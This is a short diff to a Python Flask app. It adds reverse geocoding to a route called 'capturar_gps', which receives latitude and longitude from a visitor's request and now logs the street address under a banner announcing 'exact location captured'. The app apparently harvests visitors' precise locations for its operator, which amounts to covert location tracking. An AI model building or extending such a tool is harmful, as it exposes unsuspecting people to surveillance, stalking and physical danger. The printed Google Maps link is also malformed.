@@ -1,4 +1,5 @@
 from flask import Flask, request, render_template_string
+import geocoder
 
 app = Flask(__name__)
 
@@ -64,9 +65,19 @@ def inicio():
 def capturar_gps():
     lat = request.args.get('lat')
     lon = request.args.get('lon')
-    print("\n---Ubicacion---")
+
+    direccion_real = "No encontrada"
+    try:
+        g = geocoder.osm([lat, lon], method='reverse')
+        if g.ok:
+            direccion_real = g.address
+    except Exception as e:
+        direccion_real = f"Error al traducir: {e}"
+
+    print("\n--- [🔥] ¡UBICACIÓN EXACTA CAPTURADA! ---")
     print(f"Latitud: {lat}")
     print(f"Longitud: {lon}")
+    print(f"Dirección Real: {direccion_real}") 
     print(f"Ver en Google Maps: https://google.com{lat},{lon}")
     print("-----------------------------------------\n")
     return "OK", 200
